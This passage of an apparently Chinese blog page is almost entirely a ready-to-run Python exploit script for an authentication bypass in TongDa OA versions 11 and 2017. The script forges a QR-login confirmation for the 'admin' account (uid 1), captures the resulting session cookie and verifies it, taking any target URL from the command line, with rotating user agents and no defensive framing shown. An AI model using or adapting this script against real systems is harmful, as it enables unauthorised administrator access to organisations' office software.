class="line">    checkUrl = url+<span class="string">&#x27;/ispirit/login_code.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        codeUid = resText[<span class="string">&#x27;codeuid&#x27;</span>]</span><br><span class="line">        codeScanUrl = url+<span class="string">&#x27;/general/login_code_scan.php&#x27;</span></span><br><span class="line">        res = requests.post(codeScanUrl, data=&#123;<span class="string">&#x27;codeuid&#x27;</span>: codeUid, <span class="string">&#x27;uid&#x27;</span>: <span class="built_in">int</span>(</span><br><span class="line">            <span class="number">1</span>), <span class="string">&#x27;source&#x27;</span>: <span class="string">&#x27;pc&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;confirm&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;,headers=headers)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        status = resText[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> status == <span class="built_in">str</span>(<span class="number">1</span>):</span><br><span class="line">            getCodeUidUrl = url+<span class="string">&#x27;/ispirit/login_code_check.php?codeuid=&#x27;</span>+codeUid</span><br><span class="line">            res = requests.get(getCodeUidUrl)</span><br><span class="line">            tmp_cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">            headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">            headers[<span class="string">&quot;Cookie&quot;</span>] = tmp_cookie</span><br><span class="line">            check_available = requests.get(url + <span class="string">&#x27;/general/index.php&#x27;</span>,headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;用户未登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;重新登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                    print(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span> + tmp_cookie)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span> + url + <span class="string">&#x27;,Maybe Not Vulnerable.&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url  + <span class="string">&#x27; Maybe Not Vulnerable ?&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-v&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--tdoaversion&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">        choices=[<span class="number">11</span>, <span class="number">2017</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Target TongDa OA Version. e.g: -v 11、-v 2017&quot;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-url&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--targeturl&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1&quot;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.targeturl</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">    <span class="keyword">if</span> args.tdoaversion == <span class="number">11</span>:</span><br><span class="line">        getV11Session(url)</span><br><span class="line">    <span class="keyword">elif</span> args.tdoaversion == <span class="number">2017</span>:</span><br><span class="line">        get2017Session(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br></pre></td></tr></table></figure>
  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2020-12-13</span>
  </div>

  <div class="post-footer">
    

    <a href="#top" class="top">返回顶部</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2021
  <span class="author">
    tutucoo
  </span>
</footer>


    </div>
  </body>
</html>